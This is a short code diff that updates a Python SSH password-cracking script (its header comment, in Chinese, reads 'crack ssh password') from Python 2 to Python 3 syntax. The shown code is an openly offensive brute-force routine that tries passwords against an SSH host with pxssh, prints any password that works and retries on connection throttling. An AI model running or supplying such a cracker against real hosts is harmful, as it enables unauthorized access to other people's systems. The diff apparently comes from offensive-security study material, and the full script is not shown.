@@ -8,7 +8,7 @@
 
 # 破解ssh密码
 
-import pxssh
+from pexpect import pxssh
 import optparse
 import time
 import threading
@@ -19,12 +19,14 @@ found = False
 fails = 0
 
 def connect(host, user, password, release):
+    global found
+    global fails
     try:
         con = pxssh.pxssh()
         con.login(host, user, password)
         print('[+] Password found: ' + password)
         found = True
-    except Exception, e:
+    except Exception as e:
         if 'read_nonblocking' in str(e):
             fails += 1
             time.sleep(5)
